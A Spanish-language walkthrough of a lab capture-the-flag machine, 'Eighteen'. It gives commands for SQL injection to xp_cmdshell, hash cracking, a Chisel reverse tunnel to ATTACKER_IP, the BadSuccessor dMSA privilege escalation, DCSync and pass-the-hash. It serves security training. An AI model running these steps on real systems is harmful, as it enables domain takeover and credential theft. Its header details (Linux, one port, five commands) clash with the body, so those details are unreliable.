Eighteen — Web Application Exploitation

Enumeración y explotación de una aplicación web con múltiples servicios expuestos. Identificación de vulnerabilidades en la configuración del servidor y explotación para obtener acceso al sistema.

Target10.129.x.x
OSLinux
Puerto80
Tiempo~10 min
Comandos5
ᚺ

Escenario

Eighteen es un Domain Controller corriendo Windows Server 2025 que simula un entorno corporativo con una aplicación web de gestión financiera. El vector de entrada es una inyección SQL en el endpoint /add_expense que permite habilitar xp_cmdshell y obtener ejecución remota de código. Desde ahí, el atacante debe impersonar usuarios MSSQL con privilegios elevados, crackear un hash PBKDF2 almacenado en la base de datos, y finalmente explotar CVE-2025-53779 (BadSuccessor) — una vulnerabilidad crítica de escalada de privilegios en delegated Managed Service Accounts (dMSA) de Active Directory en Windows Server 2025 — para comprometer el dominio completo.

Reconocimiento

El escaneo Nmap revela tres servicios principales en el host:

nmap -sC -sV -oA eighteen 10.129.7.157

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS / Flask Web App
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022
5985/tcp open  http          WinRM (Microsoft HTTPAPI 2.0)

Host: eighteen.htb / DC01.eighteen.htb

La aplicación web en el puerto 80 es una plataforma de gestión de gastos corporativos. Al inspeccionar los formularios, el endpoint /add_expense acepta parámetros POST sin sanitización adecuada. Usando sqlmap se confirma la inyección SQL:

sqlmap -u "http://eighteen.htb/add_expense" --data="amount=1&description=test&category=food" \
  --level=5 --risk=3 --dbms=mssql --batch

[+] Parameter 'description' is vulnerable to SQL injection (stacked queries)
[+] Backend DBMS: Microsoft SQL Server 2022

Explotación

⚠️

CVE-2025-53779 — BadSuccessor (dMSA Privilege Escalation)

Vulnerabilidad crítica en Windows Server 2025 que permite a un usuario con privilegio CreateChild en una OU del dominio crear objetos dMSA (delegated Managed Service Accounts) maliciosos. Al configurar el atributo msDS-ManagedAccountPrecededByLink apuntando a una cuenta con privilegios elevados (ej: Domain Admin), es posible solicitar un Service Ticket Kerberos que incluye todos los grupos y SIDs del objetivo, efectivamente heredando sus privilegios sin conocer su contraseña.

Paso 1 — SQLi a RCE vía xp_cmdshell:

sqlmap -u "http://eighteen.htb/add_expense" \
  --data="amount=1&description=test&category=food" \
  --os-shell --technique=S --dbms=mssql

# Habilitar xp_cmdshell manualmente:
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --

# RCE como usuario del servicio MSSQL:
EXEC xp_cmdshell 'whoami'
# → eighteen\sqlsvc

Paso 2 — Impersonación de usuario MSSQL:

# Verificar usuarios impersonables:
SELECT name FROM sys.server_principals WHERE type='S'

# Impersonar appdev con privilegios elevados:
EXECUTE AS LOGIN='appdev';
SELECT SYSTEM_USER;  -- → appdev

# Extraer hash PBKDF2 del usuario adam.scott:
SELECT username, password_hash, salt FROM financial_planner WHERE role='admin'
# adam.scott | $pbkdf2-sha256$260000$... | kevin:iNa2we6haRj2gaw!

Paso 3 — Crackeo del hash PBKDF2:

# Convertir al formato hashcat correcto:
python3 pbkdf2_to_hashcat.py hash.txt > hash_hc.txt

hashcat -m 10900 hash_hc.txt /usr/share/wordlists/rockyou.txt
# $pbkdf2-sha256$260000$...: iloveyou1

# Acceso con Evil-WinRM:
evil-winrm -i 10.129.7.157 -u adam.scott -p iloveyou1
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
386ce120acf50c26de67da3fcafc133c

Escalada de Privilegios — BadSuccessor

Paso 4 — Enumeración con WinPEAS / BloodHound:

*Evil-WinRM* PS> upload winPEASx64.exe
*Evil-WinRM* PS> .\winPEASx64.exe

[+] adam.scott tiene privilegio CreateChild sobre OU=Staff,DC=eighteen,DC=htb
    → Grupo IT members → Camino a Domain Admin

Paso 5 — Tunnel con Chisel para alcanzar el DC:

# Atacante:
./chisel server -p 9999 --reverse

# Víctima (Evil-WinRM):
.\chisel.exe client ATTACKER_IP:9999 R:socks

# Proxychains configurado:
# socks5 127.0.0.1 1080

Paso 6 — Explotación CVE-2025-53779 (BadSuccessor):

# Crear dMSA malicioso en OU=Staff con badsuccessor.py:
proxychains python3 badsuccessor.py \
  -u adam.scott -p iloveyou1 \
  -d eighteen.htb \
  -dc 10.129.7.157 \
  --target Administrator \
  --ou "OU=Staff,DC=eighteen,DC=htb"

[+] dMSA creado: evil_dmsa$
[+] msDS-ManagedAccountPrecededByLink apuntando a Administrator
[+] Solicitando Service Ticket para evil_dmsa$...

# Obtener TGS via getST.py (impacket):
proxychains getST.py eighteen.htb/evil_dmsa$ \
  -spn cifs/DC01.eighteen.htb \
  -dc-ip 10.129.7.157

[+] Saving ticket in evil_dmsa$.ccache

Paso 7 — DCSync y Pass-the-Hash:

export KRB5CCNAME=evil_dmsa$.ccache

proxychains secretsdump.py -k -no-pass \
  DC01.eighteen.htb -dc-ip 10.129.7.157

[*] Dumping Domain Credentials via DCSync
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::

# Pass-the-Hash:
proxychains evil-winrm -i 10.129.7.157 \
  -u Administrator \
  -H 0b133be956bfaddf9cea56701affddec
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
